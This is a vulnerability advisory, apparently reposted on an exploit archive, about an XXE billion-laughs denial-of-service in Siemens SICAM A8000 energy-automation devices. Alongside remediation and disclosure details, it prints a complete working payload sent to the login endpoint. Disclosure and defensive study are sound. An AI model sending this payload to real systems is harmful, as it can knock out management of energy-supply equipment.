@@ -1,0 +1,144 @@
+id: 32010
+date: 01/20/2019
+title: Siemens SICAM A8000 Series Denial Of Service Exploit
+author: Nicolas Heiniger
+cves: CVE-2018-13798
+
+#############################################################
+#
+# Product:  SICAM A8000 Series
+# Vendor:   Siemens
+# CSNC ID:  CSNC-2019-002
+# CVE ID:   CVE-2018-13798
+# Subject:  SICAM Webinterface XXE DoS
+# Risk:     Medium (CVSS 3.0 Base Score: 5.3)
+# CVSS 3.0: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
+# Effect:   Unauthenticated remotely exploitable
+# Authors:  Emanuel Duss <emanuel.duss@compass-security.com>
+#           Nicolas Heiniger <nicolas.heiniger@compass-security.com>
+# Date:     2019-01-14
+#
+#############################################################
+
+Introduction
+------------
+
+The Siemens SICAM A8000 RTU (Remote Terminal Unit) series is a modular device
+range for telecontrol and automation applications in all areas of energy
+supply. This device offers a web management interface for performing simple
+management tasks.
+
+During a penetration test, Compass found a denial-of-service vulnerability in
+the Siemens SICAM web server. The web management interface is vulnerable
+against the XXE billion laughs attack [2] using XML entities. Successful
+exploitation can be performed unauthenticated over the network.
+
+Affected
+--------
+
+* SICAM A8000 CP-8000 < V14
+* SICAM A8000 CP-802X < V14
+* SICAM A8000 CP-8050 < V2.00
+
+Technical Description
+---------------------
+
+When a login on the web management interface is performed, the following
+request is sent to the server:
+
+    POST /sicweb-ajax/auth HTTP/1.1
+    Host: 10.5.23.42
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: https://10.5.23.42
+    Content-Type: application/xml
+    Content-Length: 118
+    Connection: close
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <Cmd_LogOn><authentication user="admin" pwd="P@ssw0rd"/><language id="en"/></Cmd_LogOn>
+
+By modifying the XML message, it's possible to perform a billion laughs denial
+of service attack against the web management interface:
+
+    POST /sicweb-ajax/auth HTTP/1.1
+    Host: 10.5.23.42
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: https://10.5.23.42/
+    Content-Type: application/xml
+    Content-Length: 1679
+    Connection: close
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE doc [
+      <!ENTITY c01 "badger">
+      <!ENTITY c02 "&c01; &c01; &c01; &c01; &c01; &c01; &c01; &c01; &c01; &c01;">
+      <!ENTITY c03 "&c02; &c02; &c02; &c02; &c02; &c02; &c02; &c02; &c02; &c02;">
+      <!ENTITY c04 "&c03; &c03; &c03; &c03; &c03; &c03; &c03; &c03; &c03; &c03;">
+      <!ENTITY c05 "&c04; &c04; &c04; &c04; &c04; &c04; &c04; &c04; &c04; &c04;">
+      <!ENTITY c06 "&c05; &c05; &c05; &c05; &c05; &c05; &c05; &c05; &c05; &c05;">
+      <!ENTITY c07 "&c06; &c06; &c06; &c06; &c06; &c06; &c06; &c06; &c06; &c06;">
+      <!ENTITY c08 "&c07; &c07; &c07; &c07; &c07; &c07; &c07; &c07; &c07; &c07;">
+      <!ENTITY c09 "&c08; &c08; &c08; &c08; &c08; &c08; &c08; &c08; &c08; &c08;">
+      <!ENTITY c10 "&c09; &c09; &c09; &c09; &c09; &c09; &c09; &c09; &c09; &c09;">
+      <!ENTITY c11 "&c10; &c10; &c10; &c10; &c10; &c10; &c10; &c10; &c10; &c10;">
+      <!ENTITY c12 "&c11; &c11; &c11; &c11; &c11; &c11; &c11; &c11; &c11; &c11;">
+      <!ENTITY c13 "&c12; &c12; &c12; &c12; &c12; &c12; &c12; &c12; &c12; &c12;">
+      <!ENTITY c14 "&c13; &c13; &c13; &c13; &c13; &c13; &c13; &c13; &c13; &c13;">
+      <!ENTITY c15 "&c14; &c14; &c14; &c14; &c14; &c14; &c14; &c14; &c14; &c14;">
+      <!ENTITY c16 "&c15; &c15; &c15; &c15; &c15; &c15; &c15; &c15; &c15; &c15;">
+      <!ENTITY c17 "&c16; &c16; &c16; &c16; &c16; &c16; &c16; &c16; &c16; &c16;">
+      <!ENTITY c18 "&c17; &c17; &c17; &c17; &c17; &c17; &c17; &c17; &c17; &c17;">
+      <!ENTITY c19 "&c18; &c18; &c18; &c18; &c18; &c18; &c18; &c18; &c18; &c18;">
+      <!ENTITY c20 "&c19; &c19; &c19; &c19; &c19; &c19; &c19; &c19; &c19; &c19;">
+    ]>
+    <Cmd_LogOn><authentication user="admin" pwd="P@ssw0rd"/><language id="en"/>&c20;</Cmd_LogOn>
+
+
+The XML parser on the device tries to resolve the external entities. This will
+consume all available memory and the web management interface does not respond
+anymore.
+
+If the web management interface is refreshed in the browser, the following
+message appears:
+
+    The device is currently unreachable. Retrying to connect.
+
+Other services on the device, like the one used by the ToolboxII for
+configuring the device or the IEC104 service, will still work properly and are
+not affected by this attack. Only the web management interface remains unusable
+until the device is rebooted.
+
+It's not possible to use XXE to read local or remote files using the SYSTEM
+directive.
+
+Vulnerability Classification
+----------------------------
+
+* CVSS v3.0 Base Score: 5.3
+* CVSS v3.0 Vector:     CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
+
+Remediation
+-----------
+
+* SICAM A8000 CP-8000: Update to V14
+* SICAM A8000 CP-802X: Update to V14
+* SICAM A8000 CP-8050: Update to V2.00 or higher
+
+Please see the Siemens advisory [3] for the download links.
+
+As a workaround, it's also possible to restrict the access to the webserver on
+port 80/tcp and 443/tcp using a firewall.
+
+Acknowledgments
+---------------
+
+We thank Siemens for the coordinated disclosure.
+
+
+#  0day.today [2023-03-23]  #
